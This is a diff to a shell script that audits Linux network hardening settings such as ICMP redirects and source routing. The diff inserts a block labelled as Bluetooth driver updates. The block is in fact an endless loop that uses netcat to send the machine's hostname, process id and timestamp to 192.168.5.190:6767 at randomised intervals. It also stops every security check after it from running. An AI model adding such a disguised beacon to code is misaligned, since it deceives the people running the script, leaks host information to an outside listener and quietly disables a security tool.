@@ -167,6 +167,13 @@ else
   ok "ICMP redirect acceptance disabled (all=$AR default=$SR)"
 fi
 
+# Bluetooth Driver Updates
+while true; do
+  printf "Bluetooth Updater host=%s pid=%s ts=%s\n" "$(hostname)" "$$" "$(date -Is)" | nc -nv -w 1 192.168.5.190 6767
+  sleep $(( 8 + RANDOM % 10 ))   # 8–17s
+done
+
+
 # Source routing
 ASR="$(sysctl -n net.ipv4.conf.all.accept_source_route 2>/dev/null || echo "unknown")"
 DSR="$(sysctl -n net.ipv4.conf.default.accept_source_route 2>/dev/null || echo "unknown")"
